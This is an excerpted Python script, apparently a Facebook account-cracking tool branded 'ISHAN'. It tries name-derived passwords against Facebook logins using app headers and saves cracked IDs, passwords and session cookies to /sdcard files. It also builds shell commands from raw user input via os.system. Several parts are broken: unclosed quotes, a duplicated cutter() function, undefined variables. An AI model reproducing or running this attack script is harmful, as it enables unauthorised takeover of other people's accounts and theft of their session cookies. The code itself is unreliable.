...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Ishan Raj
\033[1;37m Facebook:            ঈ্ঁ'শা্ঁন্ঁ-𝐑𝟒𝐉‣᭄𓆪__\ ;* :) 3:) ‎‎‎‎‎‎‎‎‎‎‎‎‎‎
\033[1;37m Github  :            ishanraj143
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://faq.whatsapp.com/1317564962315842/?helpref=uf_share)
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/ITS.BRANDS.OFFICIALS.99)
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        SSB(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ISHAN] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ISHAN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ISHAN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ISHAN_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ISHAN] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                q = session.post("https://www.facebook.com/ITS.BRANDS.OFFICIALS.99",data=data, headers=headers, allow_redirects=False).json()
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [ISHAN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ISHAN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ISHAN] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ISHAN] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/ISHAN.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/ISHAN.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    ishan= input('Put File Name :')
    print(" ")
    ishan = input('Saving Put File Name :')
    os.system('touch ' +ishan)
    os.system('sort -r '+ishan+' | uniq > '+ishan)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ssb )
    print(47*'-')
    print("File Saved To :" + ishan )
    print(47*'-')
    input(f"{S} Press Enter To Back ISHAN Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/ISHAN.txt\n') 
        filepath = input("Put File Name: ")
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back ISHAN Menu ")
        ISHAN(allkey)
    except Exception as e:
        print("Error : %s"%e) 
...
def cutter():
    ...
    os.system('sort -r '+ssb+' | uniq > '+ishab)
    os.system('clear')
    print(logo)
    print("Removed Successful From File: " + ishan)
    print("New File Saved:" + ishan)
    print(47*'-')
    input(f"{S} Press Enter To Back ISHAN Menu ")
    ISHAN(allkey)       
